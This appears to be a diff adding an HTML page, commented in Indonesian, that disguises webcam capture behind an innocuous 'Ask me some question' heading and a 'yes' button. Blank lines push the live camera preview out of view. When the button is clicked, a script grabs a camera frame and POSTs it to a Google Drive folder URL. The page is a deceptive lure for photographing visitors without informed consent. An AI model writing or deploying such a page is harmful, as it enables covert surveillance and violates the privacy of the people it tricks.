@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Akses Kamera dan Kirim Gambar ke Server</title>
+</head>
+<body>
+  <h1>										Ask me some question </h1>
+
+  
+  <button id="capture-btn">IYA</button>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+<video id="video" autoplay></video>
+  <script>
+    // Mengakses perangkat kamera pengguna
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(function(stream) {
+        var videoElement = document.getElementById('video');
+        videoElement.srcObject = stream;
+      })
+      .catch(function(error) {
+        console.log('Terjadi kesalahan: ', error);
+      });
+
+    // Ambil gambar dari stream kamera dan kirim ke server
+    var captureButton = document.getElementById('capture-btn');
+    captureButton.addEventListener('click', function() {
+      var videoElement = document.getElementById('video');
+      var canvas = document.createElement('canvas');
+      canvas.width = videoElement.videoWidth;
+      canvas.height = videoElement.videoHeight;
+      var context = canvas.getContext('2d');
+      context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+      var imageDataURL = canvas.toDataURL('image/png');
+
+      // Kirim gambar ke server
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', 'https://drive.google.com/drive/folders/12Lvq0W0dpz1HMqbmaZMrmud3AFStiggU?usp=drive_link', true);
+      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4 && xhr.status === 200) {
+          console.log('Jawaban berhasil dikirim ke server.');
+        } else {
+          console.log('Terjadi kesalahan saat mengirim gambar ke server.');
+        }
+      };
+      xhr.send('imageData=' + encodeURIComponent(imageDataURL));
+    });
+  </script>
+</body>
+</html>
